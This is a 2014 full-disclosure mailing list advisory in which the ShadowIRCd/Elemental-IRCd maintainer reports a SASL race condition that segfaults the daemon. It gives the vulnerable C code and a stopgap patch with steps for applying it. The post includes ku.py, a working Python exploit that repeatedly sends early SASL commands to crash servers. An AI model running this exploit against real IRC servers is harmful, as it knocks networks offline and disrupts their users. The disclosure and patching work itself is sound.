@@ -1,0 +1,206 @@
+
+Date: Mon, 17 Mar 2014 11:06:38 -0700
+From: Sam Dodrill <shadow.h511@...il.com>
+To: full-disclosure@...ts.grok.org.uk
+Subject: Emergency patch for ShadowIRCd versions 6.3+ and
+	Elemental-IRCd 6.5+
+
+Emergency patch for ShadowIRCd versions 6.3+ and Elemental-IRCd 6.5+
+
+A vulnerability has been discovered in Elemental-IRCd/ShadowIRCd all the
+way back to version 6.3. If a client does a SASL authentication before the
+server is ready for it, a race condition will be met and the ircd will
+segfault to an address out of bounds error. The attached exploit, ku.py is
+pasted below:
+
+    #!/usr/bin/python2
+    # Live exploit for ShadowIRCd 6.3+, remote segfault that can
+    # take out other daemons in the network.
+
+    import base64
+    import socket
+
+    SERVER = "irc.example.com"
+    NICK = "Shi" # death
+    PASS = "ku"  # suffering
+
+    while True:
+        s_link = socket.socket()
+
+        s_link.connect((SERVER, 6667))
+
+        s_link.send("CAP REQ :sasl\r\n")
+        s_link.send("AUTHENTICATE PLAIN\r\n")
+        s_link.send("AUTHENTICATE %s" %
+                (base64.b64encode("%s\0%s\0%s" % (NICK, NICK, PASS))))
+        s_link.send("CAP END")
+        s_link.send("NICK %s\r\n" % NICK)
+        s_link.send("USER a a a a a\r\n")
+
+        try:
+            for line in s_link.makefile("r"):
+                print line
+        except:
+            continue
+
+Earlier versions of this were called "shi.py" and its source (adapted from
+the original code of the person who reported the bug to me) is available
+here: https://gist.github.com/lyska/89eacfc21903a50a0e93
+
+Testing has shown that if the following patch is not applied, any
+unregistered user may segfault off any ircd, including hub daemons or
+sometimes an ircd on the other side of the network; provided they have a
+valid account with services. This is a heisenbug and will resist attempts
+to reproduce, but keep running it. It will kill something eventually.
+
+The cause of this is an unmet race condition in modules/m_sasl.c. The SASL
+authentication spec says that an authentication session must go like this
+(taken from the documentation):
+
+    C: CAP REQ :sasl
+    C: NICK jilles
+    C: USER jilles cheetah.stack.nl 1 :Jilles Tjoelker
+    S: NOTICE AUTH :*** Processing connection to jaguar.test
+    S: NOTICE AUTH :*** Looking up your hostname...
+    S: NOTICE AUTH :*** Checking Ident
+    S: NOTICE AUTH :*** No Ident response
+    S: NOTICE AUTH :*** Found your hostname
+    S: :jaguar.test CAP jilles ACK :sasl
+    C: AUTHENTICATE PLAIN
+    S: AUTHENTICATE +
+    C: AUTHENTICATE amlsbGVzAGppbGxlcwBzZXNhbWU=
+    S: :jaguar.test 900 jilles jilles!jilles@...alhost.stack.nl jilles :You
+are now logged in     as jilles.
+    S: :jaguar.test 903 jilles :SASL authentication successful
+    C: CAP END
+    S: :jaguar.test 001 jilles :Welcome to the jillestest Internet Relay
+Chat Network jilles
+    (usual welcome messages)
+
+However, if a user does this:
+
+    C: CAP REQ :sasl
+    S: :my.testnet NOTICE * :*** Looking up your hostname...
+    S: :my.testnet NOTICE * :*** Checking Ident
+    S: :my.testnet NOTICE * :*** Found your hostname
+    S: :my.testnet NOTICE * :*** No Ident response
+    S: :my.testnet CAP * ACK :sasl
+    C: AUTHENTICATE PLAIN
+    C: AUTHENTICATE U3RhcmJvdW5kAFN0YXJib3VuZAA1K0By
+    C: CAP END
+    S: AUTHENTICATE +
+    S: :my.testnet 903 * :SASL authentication successful
+
+The daemon immediately segfaults after that 903. A backtrace of the core
+dump will look like the following:
+https://gist.github.com/lyska/f1c93e86917dfef958fb.
+
+The affected code in modules/m_sasl.c is as follows (spacing has been
+fixed):
+
+    static int server_auth_sasl(struct Client *client_p)
+    {
+        char *auth_user;
+
+        if (client_p->localClient->auth_user)
+        {
+            memset(client_p->localClient->auth_user, 0,
+                strlen(client_p->localClient->auth_user));
+            rb_free(client_p->localClient->auth_user);
+            client_p->localClient->auth_user = NULL;
+        }
+
+        auth_user = rb_strndup(client_p->user->suser, PASSWDLEN);
+
+        /* pointless check here */
+        if (auth_user)
+            client_p->localClient->auth_user = rb_strndup(auth_user,
+PASSWDLEN);
+
+        return 0;
+    }
+
+When a client attempts to do a SASL authentication too quickly (like
+demonstrated in ku.py), the ircd sometimes segfaults and can take out its
+uplink too. This is because the `auth_user` field in
+`client_p->localClient` gets set to uninitialized stack memory.
+
+>From linked file `sparkle.bt`, line 10:
+
+    auth_user = 0x516c0d05e40 " \331\264(\306p"
+
+This is definitely not the plain ASCII that it is expecting, nor at the
+expected length. Luckily, this issue is completely in a module and it can
+be applied with zero downtime if you apply this patch and follow the below
+directions:
+
+    diff --git a/modules/m_sasl.c b/modules/m_sasl.c
+    index cbc5c77..fadddf7 100644
+    --- a/modules/m_sasl.c
+    +++ b/modules/m_sasl.c
+    @@ -162,7 +162,7 @@ me_sasl(struct Client *client_p, struct Client
+*source_p,
+                            sendto_one(target_p, form_str(RPL_SASLSUCCESS),
+me.name, EmptyString(target_p->name) ? "*" : target_p->name);
+                            target_p->preClient->sasl_complete = 1;
+                            ServerStats.is_ssuc++;
+    -                       server_auth_sasl(target_p);
+    +                       //server_auth_sasl(target_p);
+                    }
+                    *target_p->preClient->sasl_agent = '\0'; /* Blank the
+stored agent so someone else can answer */
+            }
+
+This patch sometimes has issues when being applied by machine (use vim,
+it's not hard) and should only be considered a stopgap to remove the worst
+parts of the issue until a more permanent fix is made, tested, and released.
+
+Attempts have been made to contact other networks that use any affected
+versions of ShadowIRCd and Elemental-IRCd. All attempts to contact networks
+I previously have not encountered have failed.
+
+Patch directions are below:
+
+1. Apply patch by hand
+2. run make
+3. run make install
+4. Connect to the ircd, opering up
+5. /modunload m_sasl.so
+6. /modload m_sasl.so
+
+You might be tempted to use /modreload, but *DO NOT*. There is a known
+issue with reloading a module that has changed on disk that can cause a
+segmentation fault. These directions should be followed *immediately* upon
+recieving them to avoid opening yourself up to this exploit.
+
+This bug appears to have been introduced with ShadowIRCd 6.3. Details from
+the NEWS file below:
+
+    -- shadowircd-6.3.0
+    - use auth::auth_user for SASL. It is no longer usable in PASS (though
+its
+      use-case there is non-existant), but you can now set so if a user
+
+      successfully authenticates to the accountname in auth_user with SASL,
+
+      they will get the proper auth block privs. You can have multiple
+auth_users
+      in one auth block.
+
+This patch does disable this functionality, but in this case the
+inconvenience is worth the security.
+
+Thanks for reading, and I hope you enjoyed this report. I've been wanting
+to make a report to this mailing list for a while now and was hoping it
+would not be on one of my own projects, but such is life. Should I request
+a CVE be assigned for this as well?
+
+Sam Dodrill
+shadow.h511@...il.com
+
+Content of type "text/html" skipped
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
